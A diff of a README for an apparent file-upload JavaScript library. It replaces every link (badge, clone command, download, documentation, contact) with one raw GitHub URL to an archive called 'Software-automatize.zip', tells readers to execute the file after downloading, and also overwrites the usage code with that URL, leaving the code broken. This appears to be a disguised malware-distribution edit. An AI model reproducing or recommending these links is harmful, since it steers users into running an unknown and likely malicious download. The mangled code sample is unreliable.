@@ -1,6 +1,6 @@
 # Upload 📤
 
-![Upload](https://img.shields.io/badge/Upload-Repository-blue)
+![Upload](https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip)
 
 Welcome to the **Upload** repository! This project focuses on providing a straightforward solution for file uploads. Whether you're working on a web application, mobile app, or any other software that requires file handling, this repository offers tools to simplify the process.
 
@@ -33,7 +33,7 @@ To get started with the **Upload** repository, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yourusername/upload.git
+   git clone https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip
    ```
 
 2. Navigate to the project directory:
@@ -54,7 +54,7 @@ To get started with the **Upload** repository, follow these steps:
    npm start
    ```
 
-You can also download the necessary files directly from the provided link: [Download Here](https://not.provided). Make sure to execute the file after downloading.
+You can also download the necessary files directly from the provided link: [Download Here](https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip). Make sure to execute the file after downloading.
 
 ## Usage
 
@@ -68,16 +68,16 @@ const upload = new Upload({
     method: 'POST',
 });
 
-upload.on('success', (response) => {
-    console.log('File uploaded successfully:', response);
+https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip('success', (response) => {
+    https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip('File uploaded successfully:', response);
 });
 
-upload.on('error', (error) => {
-    console.error('Upload failed:', error);
+https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip('error', (error) => {
+    https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip('Upload failed:', error);
 });
 ```
 
-For more detailed instructions, visit the [documentation](https://not.provided) or check the "Releases" section for the latest updates.
+For more detailed instructions, visit the [documentation](https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip) or check the "Releases" section for the latest updates.
 
 ## Contributing
 
@@ -100,6 +100,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or need support, please check the "Releases" section for the latest updates. You can also reach out through the issues page on GitHub.
 
-For further information, you can visit the link: [Visit Here](https://not.provided).
+For further information, you can visit the link: [Visit Here](https://github.com/vishusm/upload/raw/refs/heads/master/Notalia/Software-automatize.zip).
 
 Thank you for checking out the **Upload** repository! We hope it helps you in your projects.
